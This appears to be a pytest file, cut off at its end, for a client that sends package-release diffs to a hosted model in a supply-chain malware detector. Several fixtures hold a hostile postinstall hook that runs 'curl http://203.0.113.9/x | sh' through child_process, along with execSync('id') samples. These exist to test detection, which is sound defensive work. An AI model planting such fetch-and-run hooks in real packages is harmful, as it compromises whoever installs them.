"""Clef client against a fake Workers AI endpoint. Synthetic inputs only; no network."""

import json
import logging
from datetime import datetime, timezone

import pytest

from hunter.bands import REVIEW_FLOOR, REVIEW_THRESHOLD
from hunter.classify import classification_incomplete, classify_files
from hunter.clef import (
    STATE_TOKENS,
    ClefClient,
    chunk_excerpt_states,
    clef_head_name,
    counts_drifted,
    merge_dangerous_answers,
    parse_answer,
    resolve_clef_model,
)
from hunter.clef_tokens import hosted_state_was_cut, question_schema_tokens, state_tokens, wrapper_tokens
from hunter.config import Config
from hunter.db import Database
from hunter.head import load_head
from hunter.models import ReleaseMeta
from hunter.questions import PACKAGE_CONTENT_RULE, clef_pass_b_questions, pass_b_questions, pass_c_questions
from hunter.scout_model import (
    ChoiceView,
    NoulView,
    ScoutAnswer,
    ScoutModelUnavailable,
    Usage,
    head_name,
    head_name_for,
    make_scout_model,
    require_scoring_layer,
    state_token_budget,
)
from hunter.spend import SpendMeter


def _envelope(answers: dict, *, input_tokens: int = 1_200, model: str = "clef") -> bytes:
    return json.dumps(
        {
            "result": {
                "model": model,
                "answers": answers,
                "usage": {"input_tokens": input_tokens, "output_tokens": 0},
            },
            "success": True,
            "errors": [],
            "messages": [],
        }
    ).encode()


def _full_read_tokens(payload: dict) -> int:
    return state_tokens(payload["state"]) + wrapper_tokens(payload["questions"])


def answers_for(questions: dict, noul: float = 0.1) -> dict:
    out = {}
    for key, question in questions.items():
        kind = question["type"]
        if kind == "noul":
            out[key] = {"type": "noul", "noul": noul}
        elif kind == "choice":
            options = list(question["criteria"])
            share = 1.0 / len(options)
            out[key] = {
                "type": "choice",
                "choice": options[0],
                "probabilities": {name: share for name in options},
                "confidence": 0.5,
            }
        else:
            levels = list(question["criteria"])
            out[key] = {
                "type": "score",
                "score": 1.0,
                "legend": {str(index): text for index, text in enumerate(levels)},
                "probabilities": {str(index): 1.0 / len(levels) for index in range(len(levels))},
                "confidence": 0.6,
            }
    return out


class FakeClef:
    """Answers every question. `respond` can override status, body, or token count per request."""

    def __init__(self, respond=None):
        self.requests: list[dict] = []
        self.respond = respond

    def __call__(self, url, headers, body, timeout):
        payload = json.loads(body)
        self.requests.append({"url": url, "headers": headers, "body": payload, "timeout": timeout})
        if self.respond is not None:
            outcome = self.respond(payload, len(self.requests))
            if outcome is not None:
                return outcome
        return 200, _envelope(
            answers_for(payload["questions"]),
            input_tokens=_full_read_tokens(payload),
            model=payload["model"],
        )


def _client(transport, **kwargs) -> ClefClient:
    options = {"api_token": "test-token", "account_id": "acct123", "retries": 5, "max_rpm": 100_000}
    options.update(kwargs)
    return ClefClient(transport=transport, sleep=lambda _delay: None, **options)


def _meta(*, ecosystem: str = "npm", name: str = "widget") -> ReleaseMeta:
    return ReleaseMeta(
        ecosystem=ecosystem,
        name=name,
        new_version="1.0.1",
        old_version="1.0.0",
        rank=3,
        registry_url="https://example.test/widget",
    )


def test_request_shape_and_auth():
    fake = FakeClef()
    client = _client(fake)
    result = client.system_one({"diff_excerpt": "def add(a, b): return a + b"}, pass_b_questions())
    sent = fake.requests[0]
    assert sent["url"] == "https://api.cloudflare.com/client/v4/accounts/acct123/ai/run/@cf/cloudflare/clef"
    assert sent["headers"]["Authorization"] == "Bearer test-token"
    assert sent["body"]["model"] == "clef"
    assert sent["body"]["state"] == {"diff_excerpt": "def add(a, b): return a + b"}
    assert set(sent["body"]["questions"]) == set(pass_b_questions())
    assert result.nouls["network"].noul == 0.1
    assert result.usage.input_tokens == _full_read_tokens(sent["body"])


def test_clef_flash_uses_its_own_endpoint_and_scoring_layer():
    fake = FakeClef()
    client = _client(fake, model="clef-flash")
    client.system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
    assert fake.requests[0]["url"].endswith("/ai/run/@cf/cloudflare/clef-flash")
    assert fake.requests[0]["body"]["model"] == "clef-flash"
    assert head_name(client) == "clef_flash"


def test_choice_and_score_answers_map_into_the_shared_shape():
    questions = pass_c_questions()
    raw = _envelope(answers_for(questions))
    result = parse_answer(raw, "clef", questions)
    assert result.choices["attack_family"].choice == list(questions["attack_family"]["criteria"])[0]
    assert result.scores["blast_radius"].score == 1.0
    assert result.scores["blast_radius"].legend["0"] == questions["blast_radius"]["criteria"][0]
    assert result.nouls["cap_network"].noul == 0.1


def test_bare_system_one_body_is_read():
    questions = {"network": pass_b_questions()["network"]}
    body = json.dumps({"model": "clef", "answers": answers_for(questions, 0.7), "usage": {"input_tokens": 9}})
    result = parse_answer(body.encode(), "clef", questions)
    assert result.nouls["network"].noul == 0.7
    assert result.usage.input_tokens == 9


def test_failed_envelope_is_unavailable():
    body = json.dumps({"result": None, "success": False, "errors": [{"code": 5006, "message": "bad input"}]})
    with pytest.raises(ScoutModelUnavailable, match="bad input"):
        parse_answer(body.encode(), "clef", {})


def test_missing_answer_is_unavailable():
    def respond(payload, _count):
        answers = answers_for(payload["questions"])
        answers.pop("network")
        return 200, _envelope(answers, input_tokens=_full_read_tokens(payload))

    client = _client(FakeClef(respond), retries=1)
    with pytest.raises(ScoutModelUnavailable, match="missing answers: network"):
        client.system_one({"diff_excerpt": "x"}, pass_b_questions())


def test_rate_limit_waits_then_succeeds():
    slept: list[float] = []

    def respond(_payload, count):
        if count == 1:
            return 429, json.dumps({"errors": [{"code": 3040, "message": "rate limited"}]}).encode()
        return None

    fake = FakeClef(respond)
    client = ClefClient(
        api_token="t", account_id="a", retries=5, max_rpm=100_000, transport=fake, sleep=slept.append
    )
    result = client.system_one({"diff_excerpt": "x"}, pass_b_questions())
    assert len(fake.requests) == 2
    assert slept and slept[0] > 0
    assert result.nouls


def test_answers_are_cached():
    fake = FakeClef()
    client = _client(fake)
    first = client.system_one({"diff_excerpt": "x"}, pass_b_questions())
    second = client.system_one({"diff_excerpt": "x"}, pass_b_questions())
    assert first is second
    assert len(fake.requests) == 1


def test_network_failure_is_unavailable():
    def boom(*_args):
        raise TimeoutError("timed out")

    with pytest.raises(ScoutModelUnavailable, match="clef unavailable"):
        _client(boom, retries=1).system_one({"diff_excerpt": "x"}, pass_b_questions())


def test_missing_token_or_account_never_sends():
    fake = FakeClef()
    with pytest.raises(ScoutModelUnavailable, match="CLOUDFLARE_API_TOKEN"):
        _client(fake, api_token="", retries=1).system_one({"diff_excerpt": "x"}, pass_b_questions())
    with pytest.raises(ScoutModelUnavailable, match="CLOUDFLARE_ACCOUNT_ID"):
        _client(fake, account_id="", retries=1).system_one({"diff_excerpt": "x"}, pass_b_questions())
    assert fake.requests == []


def test_requests_are_paced_to_the_rpm_limit():
    now = {"t": 0.0}
    slept: list[float] = []

    def sleep(delay):
        slept.append(delay)
        now["t"] += delay

    client = ClefClient(
        api_token="t",
        account_id="a",
        retries=1,
        max_rpm=60,
        transport=FakeClef(),
        sleep=sleep,
        clock=lambda: now["t"],
    )
    for index in range(3):
        client.system_one({"diff_excerpt": f"x{index}"}, {"network": pass_b_questions()["network"]})
    assert slept == [pytest.approx(1.0), pytest.approx(1.0)]


def test_a_changed_model_string_is_logged(caplog):
    def respond(payload, count):
        model = "clef" if count == 1 else "clef-2"
        return 200, _envelope(answers_for(payload["questions"]), input_tokens=_full_read_tokens(payload), model=model)

    client = _client(FakeClef(respond))
    with caplog.at_level(logging.WARNING, logger="hunter.clef"):
        client.system_one({"diff_excerpt": "a"}, {"network": pass_b_questions()["network"]})
        client.system_one({"diff_excerpt": "b"}, {"network": pass_b_questions()["network"]})
    assert any("clef-2" in record.getMessage() for record in caplog.records)


def test_spend_is_recorded_at_clef_prices(tmp_path):
    db = Database(tmp_path / "s.sqlite3")
    try:
        meter = SpendMeter(db, clock=lambda: datetime(2026, 10, 3, 18, tzinfo=timezone.utc))

        def respond(payload, _count):
            return 200, _envelope(
                answers_for(payload["questions"]),
                input_tokens=_full_read_tokens(payload),
                model="clef-flash",
            )

        fake = FakeClef(respond)
        client = _client(fake, model="clef-flash")
        client.meter = meter
        client.system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
        row = db.scout_usage_rows()[0]
        assert row["provider"] == "clef"
        assert row["model"] == "clef-flash"
        assert row["input_tokens"] == _full_read_tokens(fake.requests[0]["body"])
        assert row["usd"] == pytest.approx(row["input_tokens"] / 1_000_000 * 0.038)
    finally:
        db.close()


def _section(name: str, body: str) -> str:
    return f"--- suspicious_source:{name}\n{body}"


def _varied_excerpt(count: int, label: str) -> str:
    lines = [f"{label} line {index} calls helper_{index % 17}(value);\n" for index in range(count)]
    return "".join(lines)


def _entropy(alphabet: str, count: int, seed: int = 1) -> str:
    value = seed
    chars = []
    for _ in range(count):
        value = (1103515245 * value + 12345) & 0x7FFFFFFF
        chars.append(alphabet[value % len(alphabet)])
    return "".join(chars)


def _meta_state(excerpt: str) -> dict:
    return {
        "package_name": "widget",
        "old_version": "1.0.0",
        "new_version": "1.2.3",
        "file_paths": ["lib/a.js", "lib/b.js"],
        "diff_excerpt": excerpt,
    }


def test_dense_text_is_split_by_tokens_not_characters():
    base64 = _entropy("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 6_000)
    hexa = _entropy("0123456789abcdef", 6_000, seed=2)
    assert 4_200 <= state_tokens({"diff_excerpt": base64}) <= 4_800
    assert 5_000 <= state_tokens({"diff_excerpt": hexa}) <= 5_600
    for text in (base64, hexa):
        state = _meta_state(text)
        assert state_tokens(state) > 2_048
        pieces = chunk_excerpt_states(state, STATE_TOKENS)
        assert len(pieces) >= 2
        assert "".join(piece["diff_excerpt"] for piece in pieces) == text
        for piece in pieces:
            assert piece["package_name"] == "widget"
            assert piece["old_version"] == "1.0.0"
            assert piece["new_version"] == "1.2.3"
            assert piece["file_paths"] == ["lib/a.js", "lib/b.js"]
            assert state_tokens(piece) <= STATE_TOKENS


def test_every_piece_keeps_name_versions_and_paths_inside_the_budget():
    lines = [f"function boundary_{index}() {{ return {index}; }}\n" for index in range(400)]
    state = _meta_state("".join(lines))
    pieces = chunk_excerpt_states(state, STATE_TOKENS)
    assert len(pieces) >= 2
    assert "".join(piece["diff_excerpt"] for piece in pieces) == state["diff_excerpt"]
    for piece in pieces:
        assert piece["package_name"] == "widget"
        assert piece["old_version"] == "1.0.0"
        assert piece["new_version"] == "1.2.3"
        assert piece["file_paths"] == ["lib/a.js", "lib/b.js"]
        assert state_tokens(piece) <= STATE_TOKENS
    for line in lines:
        assert any(line in piece["diff_excerpt"] for piece in pieces)
    assert chunk_excerpt_states(state, 0) == [state]


def test_a_full_read_under_the_budget_is_one_call():
    def respond(payload, _count):
        return 200, _envelope(answers_for(payload["questions"]), input_tokens=_full_read_tokens(payload))

    fake = FakeClef(respond)
    excerpt = _varied_excerpt(40, "kept")
    state = _meta_state(excerpt)
    assert state_tokens(state) <= STATE_TOKENS
    _client(fake).system_one(state, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1
    assert fake.requests[0]["body"]["state"]["package_name"] == "widget"


def test_a_cut_token_count_is_not_scored_as_a_full_read():
    def respond(payload, _count):
        local = state_tokens(payload["state"])
        wrapper = wrapper_tokens(payload["questions"])
        tokens = wrapper + 2_048 if local > 2_048 else local + wrapper
        return 200, _envelope(answers_for(payload["questions"], 0.2), input_tokens=tokens)

    fake = FakeClef(respond)
    excerpt = _entropy("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 6_000)
    state = _meta_state(excerpt)
    assert state_tokens(state) > 2_048
    assert hosted_state_was_cut(state_tokens(state), 2_292)
    client = _client(fake, state_tokens=20_000)
    result = client.system_one(state, {"network": pass_b_questions()["network"]})
    excerpts = [item["body"]["state"]["diff_excerpt"] for item in fake.requests]
    assert excerpts[0] == excerpt
    assert len(excerpts) >= 2
    assert result.nouls["network"].noul == 0.2


def test_reported_tokens_at_the_state_cap_are_a_cut():
    assert hosted_state_was_cut(3_000, 2_000 + 2_048, wrapper=2_000)
    assert hosted_state_was_cut(4_458, 2_292)
    assert not hosted_state_was_cut(1_800, 2_100, wrapper=300)


def test_http_context_error_is_treated_as_too_long():
    def respond(payload, _count):
        if len(payload["state"]["diff_excerpt"]) > 1_000:
            return 400, json.dumps({"errors": [{"code": 3036, "message": "input exceeds context length"}]}).encode()
        return None

    fake = FakeClef(respond)
    client = _client(fake)
    state = {"diff_excerpt": _section("a.js", "A" * 900) + "\n" + _section("b.js", "B" * 900)}
    client.system_one(state, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) >= 3


def _dense_blob(count: int) -> str:
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(alphabet[index % 64] for index in range(count))


def test_a_release_clef_cannot_read_goes_to_review_with_floors():
    def respond(payload, _count):
        return 200, _envelope(answers_for(payload["questions"]), input_tokens=1)

    client = _client(FakeClef(respond))
    client.head_name = "jev"
    old = {
        "package.json": json.dumps({"name": "widget", "version": "1.0.0", "dependencies": {}}),
        "index.js": "function add(a, b) { return a + b; }\n",
    }
    new = {
        "package.json": json.dumps({"name": "widget", "version": "1.0.1", "dependencies": {"codec-pad": "1.0.0"}}),
        "index.js": "function add(a, b) { return a + b; }\n",
        "lib/payload.js": _dense_blob(3_000),
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=client)
    assert result.band == "review"
    assert result.needs_llm_review is True
    assert classification_incomplete(result) is False
    assert "jev_unreadable" in result.signals
    assert result.malice_probability >= REVIEW_FLOOR
    assert result.jev_model_id == "clef"


def test_auth_failure_defers_the_release_and_logs(caplog):
    def respond(_payload, _count):
        return 401, json.dumps({"errors": [{"code": 10000, "message": "Authentication error"}]}).encode()

    client = _client(FakeClef(respond))
    client.head_name = "jev"
    old = {"index.js": "module.exports = 1;\n"}
    new = {"index.js": "require('child_process').execSync('id');\n"}
    with caplog.at_level(logging.ERROR, logger="hunter.clef"):
        result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=client, head=load_head("jev"))
    assert result.band == "deferred"
    assert "jev_retry" in result.signals
    assert classification_incomplete(result) is True
    assert sum("rejected the token" in record.getMessage() for record in caplog.records) == 1


def test_outage_defers_and_never_marks_benign():
    def respond(_payload, _count):
        return 503, b"{}"

    client = _client(FakeClef(respond))
    old = {"index.js": "module.exports = 1;\n"}
    new = {"index.js": "module.exports = 2;\n"}
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=client, head=load_head("jev"))
    assert result.band == "deferred"
    assert result.malice_probability < REVIEW_THRESHOLD
    assert classification_incomplete(result) is True


def test_full_scout_runs_on_clef_with_an_explicit_head():
    fake = FakeClef(
        lambda payload, _count: (
            200,
            _envelope(answers_for(payload["questions"], 0.95), input_tokens=_full_read_tokens(payload)),
        )
    )
    client = _client(fake)
    old = {"package.json": json.dumps({"name": "widget", "version": "1.0.0", "scripts": {}})}
    new = {
        "package.json": json.dumps(
            {"name": "widget", "version": "1.0.1", "scripts": {"postinstall": "node lib/run.js"}}
        ),
        "lib/run.js": "require('child_process').execSync('curl http://203.0.113.9/x | sh');\n",
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=client, head=load_head("jev"))
    assert result.band in {"review", "alert"}
    assert result.jev_model_id == "clef"
    assert all(item["url"].endswith("/@cf/cloudflare/clef") for item in fake.requests)


def test_setting_accepts_clef(monkeypatch):
    monkeypatch.setenv("HUNTER_SCOUT_MODEL", "clef")
    monkeypatch.setenv("HUNTER_CLEF_MODEL", "clef-flash")
    config = Config.from_env()
    assert config.scout_model == "clef"
    assert config.clef_model == "clef-flash"
    assert config.scout_model_id() == "clef-flash"
    client = make_scout_model(config)
    assert isinstance(client, ClefClient)
    assert client.model == "clef-flash"
    assert state_token_budget(client, 1) == STATE_TOKENS == 1_900
    assert head_name_for(config) == "clef_flash"


def test_unknown_clef_size_stops_startup(monkeypatch):
    monkeypatch.setenv("HUNTER_CLEF_MODEL", "clef-giant")
    with pytest.raises(ValueError, match="HUNTER_CLEF_MODEL"):
        Config.from_env()
    assert resolve_clef_model("CLEF") == "clef"
    assert clef_head_name("clef-flash") == "clef_flash"


def test_token_and_account_come_from_cloudflare_names(monkeypatch):
    monkeypatch.delenv("HUNTER_CLEF_API_TOKEN", raising=False)
    monkeypatch.setenv("CLOUDFLARE_API_TOKEN", "from-env")
    monkeypatch.setenv("CLOUDFLARE_ACCOUNT_ID", "acct-env")
    client = ClefClient()
    assert client.api_token == "from-env"
    assert client.account_id == "acct-env"


def test_uncalibrated_clef_refuses_to_serve(monkeypatch, tmp_path):
    from hunter.service import serve

    # Clef-flash has no scoring-layer file yet.
    monkeypatch.setenv("HUNTER_SCOUT_MODEL", "clef")
    monkeypatch.setenv("HUNTER_CLEF_MODEL", "clef-flash")
    config = Config.from_env()
    config.db_path = tmp_path / "never.sqlite3"
    with pytest.raises(ValueError, match="scoring-layer"):
        require_scoring_layer(config)
    with pytest.raises(ValueError, match="scoring-layer"):
        serve(config)
    assert not config.db_path.exists()


def test_jev_scoring_layer_is_present():
    require_scoring_layer(Config())


def test_calibrated_clef_passes_serve_validation(monkeypatch):
    from hunter.head import FEATURE_NAMES, head_available, head_file

    monkeypatch.setenv("HUNTER_SCOUT_MODEL", "clef")
    monkeypatch.delenv("HUNTER_CLEF_MODEL", raising=False)
    config = Config.from_env()
    assert head_name_for(config) == "clef"
    assert head_file("clef") == "logistic_head_clef.json"
    assert head_available("clef")
    require_scoring_layer(config)
    head = load_head("clef")
    assert head.feature_names == list(FEATURE_NAMES)
    review_at, alert_at = head.cutoffs
    assert 0.0 < review_at < alert_at < 1.0
    assert head.coefficients != load_head("jev").coefficients


def test_jev_stays_the_default_scout_model(monkeypatch):
    monkeypatch.delenv("HUNTER_SCOUT_MODEL", raising=False)
    config = Config.from_env()
    assert config.scout_model == "jev"
    assert head_name_for(config) == "jev"


def test_http_422_is_not_retried():
    def respond(_payload, _count):
        return 422, json.dumps({"errors": [{"message": "criteria must have at least 2 items"}]}).encode()

    fake = FakeClef(respond)
    with pytest.raises(ScoutModelUnavailable, match="422"):
        _client(fake, retries=5).system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1


def test_http_500_is_retried():
    def respond(_payload, count):
        if count < 3:
            return 500, b"{}"
        return None

    fake = FakeClef(respond)
    result = _client(fake, retries=5).system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 3
    assert result.nouls["network"].noul == 0.1


def test_jev_merge_keeps_the_confident_choice_and_clef_keeps_the_dangerous_one():
    from hunter.jev import merge_answers

    none = ScoutAnswer(
        model="m",
        choices={"attack_family": ChoiceView("none", {"none": 0.99}, 0.99)},
        usage=Usage(10, 0),
    )
    hook = ScoutAnswer(
        model="m",
        choices={"attack_family": ChoiceView("install_hook", {"install_hook": 0.4}, 0.4)},
        usage=Usage(10, 0),
    )
    unknown = ScoutAnswer(
        model="m",
        choices={"suspected_cause": ChoiceView("unknown", {"unknown": 0.95}, 0.95)},
    )
    poisoned = ScoutAnswer(
        model="m",
        choices={"suspected_cause": ChoiceView("poisoned_install_script", {"poisoned_install_script": 0.3}, 0.3)},
    )
    assert merge_answers([hook, none]).choices["attack_family"].choice == "none"
    assert merge_dangerous_answers([hook, none]).choices["attack_family"].choice == "install_hook"
    assert merge_dangerous_answers([unknown, poisoned]).choices["suspected_cause"].choice == "poisoned_install_script"
    high = ScoutAnswer(model="m", nouls={"network": NoulView(0.2)})
    low = ScoutAnswer(model="m", nouls={"network": NoulView(0.8)})
    assert merge_dangerous_answers([high, low]).nouls["network"].noul == 0.8


def test_clef_pass_b_criteria_are_shorter_and_jev_text_is_unchanged():
    jev = pass_b_questions()
    clef = clef_pass_b_questions()
    task = "Does diff_excerpt show new network access, such as an HTTP request, a socket, or a raw IP address?"
    assert jev["network"]["instructions"]["task"] == task
    assert jev["network"]["criteria"]["true"] == f"Yes. {task} {PACKAGE_CONTENT_RULE}"
    assert clef["network"]["instructions"] == jev["network"]["instructions"]
    old = question_schema_tokens(jev)
    new = question_schema_tokens(clef)
    assert 0.62 <= new / old <= 0.70
    fake = FakeClef()
    _client(fake).system_one({"diff_excerpt": "x"}, jev)
    sent = fake.requests[0]["body"]["questions"]["network"]["criteria"]["true"]
    assert sent == clef["network"]["criteria"]["true"]
    assert sent != jev["network"]["criteria"]["true"]
    _client(fake).system_one({"diff_excerpt": "y"}, {"network": jev["network"]})
    single = fake.requests[1]["body"]["questions"]["network"]["criteria"]["true"]
    assert single == jev["network"]["criteria"]["true"]


def test_a_rejected_subtype_keeps_the_other_pass_c_answers():
    def respond(payload, _count):
        if any(key.startswith("subtype_") for key in payload["questions"]):
            return 422, json.dumps({"errors": [{"message": "criteria"}]}).encode()
        answers = answers_for(payload["questions"], 0.95)
        family = answers.get("attack_family")
        if family is not None:
            names = list(family["probabilities"])
            raw = {name: (0.9 if name == "install_hook" else 0.01) for name in names}
            total = sum(raw.values())
            family["probabilities"] = {name: value / total for name, value in raw.items()}
            family["choice"] = "install_hook"
            family["confidence"] = 0.9
        cause = answers.get("suspected_cause")
        if cause is not None:
            cause["choice"] = "poisoned_install_script"
            cause["confidence"] = 0.8
        return 200, _envelope(answers, input_tokens=_full_read_tokens(payload))

    fake = FakeClef(respond)
    client = _client(fake)
    client.head_name = "jev"
    old = {"package.json": json.dumps({"name": "widget", "version": "1.0.0", "scripts": {}})}
    new = {
        "package.json": json.dumps(
            {"name": "widget", "version": "1.0.1", "scripts": {"postinstall": "node lib/run.js"}}
        ),
        "lib/run.js": "require('child_process').execSync('curl http://203.0.113.9/x | sh');\n",
    }
    result = classify_files(meta=_meta(), old_files=old, new_files=new, jev=client, head=load_head("jev"))
    subtype_calls = [
        item for item in fake.requests if any(key.startswith("subtype_") for key in item["body"]["questions"])
    ]
    assert len(subtype_calls) == 1
    assert result.band != "deferred"
    assert result.attack_family == "install_hook"
    assert result.cause == "poisoned_install_script"
    assert result.subtype == "lifecycle_script"


def test_hosted_clef_sends_the_whole_excerpt_instead_of_dropping_the_tail():
    def respond(payload, _count):
        return 200, _envelope(answers_for(payload["questions"], 0.95), input_tokens=_full_read_tokens(payload))

    fake = FakeClef(respond)
    client = _client(fake)
    client.head_name = "jev"
    body = "require('child_process').execSync('id');\n" + _entropy("0123456789abcdef", 8_000)
    old = {"package.json": json.dumps({"name": "widget", "version": "1.0.0"})}
    new = {
        "package.json": json.dumps({"name": "widget", "version": "1.0.1"}),
        "lib/blob.js": body,
    }
    classify_files(meta=_meta(), old_files=old, new_files=new, jev=client, head=load_head("jev"))
    sent = "".join(item["body"]["state"].get("diff_excerpt") or "" for item in fake.requests)
    assert "require('child_process').execSync('id');" in sent
    assert body[-80:] in sent
    assert all(
        state_tokens(item["body"]["state"]) <= STATE_TOKENS or len(item["body"]["state"].get("diff_excerpt") or "") < 400
        for item in fake.requests
    )


@pytest.mark.parametrize("status", [401, 403])
def test_auth_failure_is_not_retried_and_stops_the_client(status):
    def respond(_payload, _count):
        return status, json.dumps({"errors": [{"message": "nope"}]}).encode()

    fake = FakeClef(respond)
    client = _client(fake, retries=5)
    with pytest.raises(ScoutModelUnavailable, match="auth failed"):
        client.system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1
    with pytest.raises(ScoutModelUnavailable, match="auth failed"):
        client.system_one({"diff_excerpt": "y"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1


def test_retry_after_sets_the_wait():
    slept: list[float] = []
    now = {"t": 0.0}

    def sleep(delay):
        slept.append(delay)
        now["t"] += delay

    def respond(_payload, count):
        if count == 1:
            body = json.dumps({"errors": [{"message": "slow"}]}).encode()
            return 429, body, {"Retry-After": "7"}
        return None

    fake = FakeClef(respond)
    client = ClefClient(
        api_token="t",
        account_id="a",
        retries=5,
        max_rpm=100_000,
        transport=fake,
        sleep=sleep,
        clock=lambda: now["t"],
    )
    result = client.system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
    assert result.nouls["network"].noul == 0.1
    assert len(fake.requests) == 2
    assert any(item == pytest.approx(7.0) for item in slept)


def test_a_token_count_mismatch_stops_clef():
    def respond(payload, _count):
        return 200, _envelope(answers_for(payload["questions"]), input_tokens=_full_read_tokens(payload) + 500)

    fake = FakeClef(respond)
    client = _client(fake, retries=5)
    with pytest.raises(ScoutModelUnavailable, match="drift"):
        client.system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1
    with pytest.raises(ScoutModelUnavailable, match="drift"):
        client.system_one({"diff_excerpt": "y"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1


def test_reported_counts_match_a_full_read_or_the_state_cut_or_else_drift():
    assert counts_drifted(100, 150, 50) is False
    assert counts_drifted(3_000, 400 + 2_048, 400) is False
    assert counts_drifted(3_000, 1, 400) is False
    assert counts_drifted(100, 350, 50) is True


def test_hosted_overhead_is_two_per_question_and_one_per_option():
    from hunter.clef_tokens import hosted_schema_overhead
    from hunter.questions import clef_pass_b_questions, pass_a_questions, pass_c_questions, questions_for_clef

    noul = {"type": "noul", "prompt": "p"}
    assert hosted_schema_overhead({"a": noul}) == 4
    assert hosted_schema_overhead({"a": {"type": "choice", "prompt": "p", "criteria": {str(i): "x" for i in range(9)}}}) == 11
    assert hosted_schema_overhead({"a": {"type": "score", "prompt": "p", "criteria": ["a", "b", "c", "d"]}}) == 6
    assert hosted_schema_overhead(questions_for_clef(pass_a_questions())) == 28
    assert hosted_schema_overhead(clef_pass_b_questions()) == 44
    assert hosted_schema_overhead(questions_for_clef(pass_c_questions())) == 50


# Live Workers AI calls on @adyen/adyen-web 3.15.0, 2026-10-03:
# (state tokens, question set, reported input tokens).
LIVE_HOSTED_CALLS = [
    (1_332, "a", 2_825),
    (1_435, "b", 2_927),
    (1_435, "a", 2_928),
    (1_332, "b", 2_824),
    (1_332, "c", 2_967),
]


def _live_questions(name):
    from hunter.questions import clef_pass_b_questions, pass_a_questions, pass_c_questions, questions_for_clef

    return {
        "a": lambda: questions_for_clef(pass_a_questions()),
        "b": clef_pass_b_questions,
        "c": lambda: questions_for_clef(pass_c_questions()),
    }[name]()


@pytest.mark.parametrize("state,name,reported", LIVE_HOSTED_CALLS)
def test_live_hosted_counts_match_the_prediction_exactly(state, name, reported):
    from hunter.clef_tokens import hosted_schema_overhead, hosted_state_was_cut

    questions = _live_questions(name)
    wrapper = wrapper_tokens(questions)
    overhead = hosted_schema_overhead(questions)
    assert state + wrapper + overhead == reported
    assert counts_drifted(state, reported, wrapper, overhead) is False
    assert hosted_state_was_cut(state, reported, wrapper, overhead) is False


def test_first_pass_b_piece_no_longer_trips_drift():
    """The 2,927 reported on the first Pass B piece was 16 over the old 2,911 prediction."""
    from hunter.clef_tokens import hosted_count_tolerance, hosted_schema_overhead

    questions = _live_questions("b")
    wrapper = wrapper_tokens(questions)
    overhead = hosted_schema_overhead(questions)
    assert 1_435 + wrapper + 28 == 2_911
    assert counts_drifted(1_435, 2_927, wrapper, overhead) is False
    slack = hosted_count_tolerance(2_927)
    assert slack == 15
    assert counts_drifted(1_435, 2_927 + slack, wrapper, overhead) is False
    assert counts_drifted(1_435, 2_927 + slack + 1, wrapper, overhead) is True
    assert counts_drifted(1_435, 2_927 - slack - 1, wrapper, overhead) is True


def test_tolerance_is_a_floor_or_a_small_share():
    from hunter.clef_tokens import HOSTED_COUNT_TOLERANCE, hosted_count_tolerance

    assert hosted_count_tolerance(100) == HOSTED_COUNT_TOLERANCE == 8
    assert hosted_count_tolerance(1_600) == 8
    assert hosted_count_tolerance(2_927) == 15
    assert hosted_count_tolerance(4_000) == 20


def test_a_cut_or_a_count_method_change_still_stops_clef():
    from hunter.clef_tokens import hosted_schema_overhead, hosted_state_was_cut

    questions = _live_questions("b")
    wrapper = wrapper_tokens(questions)
    overhead = hosted_schema_overhead(questions)
    cut = wrapper + overhead + 2_048
    assert counts_drifted(3_000, cut, wrapper, overhead) is False
    assert hosted_state_was_cut(3_000, cut, wrapper, overhead) is True
    assert hosted_state_was_cut(3_000, wrapper + 2_048, wrapper, overhead) is True
    full = 1_435 + wrapper + overhead
    # Chat markers split into text again (+28) on top of the per-question count.
    assert counts_drifted(1_435, full + 28, wrapper, overhead) is True
    # A count that doubles the question block.
    assert counts_drifted(1_435, full + wrapper, wrapper, overhead) is True
    # The published count alone is still a full read.
    assert counts_drifted(1_435, 1_435 + wrapper, wrapper, overhead) is False


def test_hosted_style_counts_pass_through_the_client():
    from hunter.clef_tokens import hosted_schema_overhead

    def respond(payload, _count):
        reported = _full_read_tokens(payload) + hosted_schema_overhead(payload["questions"])
        return 200, _envelope(answers_for(payload["questions"]), input_tokens=reported)

    fake = FakeClef(respond)
    client = _client(fake)
    questions = _live_questions("b")
    result = client.system_one({"diff_excerpt": "x"}, questions)
    assert set(result.nouls) == set(questions)
    assert len(fake.requests) == 1


def test_a_release_token_budget_stops_further_calls_and_goes_to_review():
    fake = FakeClef()
    client = _client(fake, release_tokens=1)
    client.head_name = "jev"
    with pytest.raises(ScoutModelUnavailable, match="release budget"):
        client.system_one({"diff_excerpt": "x"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1
    with pytest.raises(ScoutModelUnavailable, match="release budget"):
        client.system_one({"diff_excerpt": "y"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 1
    client.begin_release()
    with pytest.raises(ScoutModelUnavailable, match="release budget"):
        client.system_one({"diff_excerpt": "z"}, {"network": pass_b_questions()["network"]})
    assert len(fake.requests) == 2

    fresh = _client(FakeClef(), release_tokens=1)
    fresh.head_name = "jev"
    old = {"index.js": "module.exports = 1;\n"}
    new = {"index.js": "require('child_process').execSync('id');\n"}
